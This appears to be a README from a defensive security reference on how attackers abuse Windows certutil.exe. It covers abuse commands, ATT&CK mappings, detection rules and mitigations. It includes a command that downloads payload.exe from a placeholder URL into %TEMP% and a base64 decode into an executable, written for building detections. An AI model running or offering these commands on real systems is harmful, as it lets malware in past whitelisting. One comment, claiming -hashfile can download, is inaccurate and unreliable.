# certutil.exe — Living-off-the-Land Payload

> **⚠️ DISCLAIMER**: Educational purposes ONLY. Do not use without authorization.

## Overview
certutil.exe is a Windows command-line utility for certificate services that attackers
abuse to download files and decode base64 content, bypassing application whitelisting.

## Common Abuse Patterns (for detection/defense reference)
```cmd
# Download file
certutil -urlcache -split -f http://[url]/payload.exe %TEMP%\payload.exe

# Decode base64-encoded file
certutil -decode encoded.b64 decoded.exe

# Verify file (can be used to download)
certutil -hashfile payload.exe MD5
```

## MITRE ATT&CK
- **T1105** — Ingress Tool Transfer (Command and Control)
- **T1027.010** — Obfuscated Files: Command Obfuscation (Defense Evasion)
- **T1218** — System Binary Proxy Execution (Defense Evasion)

## Detection
- Monitor certutil.exe for network connections (unusual for legitimate use)
- Alert on certutil.exe with -urlcache, -decode, or -decodehex arguments
- SIEM rule: certutil.exe making outbound connections
- Sysmon Event ID 3 with Image = certutil.exe

## Mitigation
- AppLocker/WDAC: Block certutil.exe if not needed
- Network filtering: Block certutil.exe network access
- Attack Surface Reduction rules

## Files
- `certutil-payloads.txt` — Common certutil abuse patterns for detection rule creation

## References
- [MITRE T1105](https://attack.mitre.org/techniques/T1105/)
- [LOLBAS certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
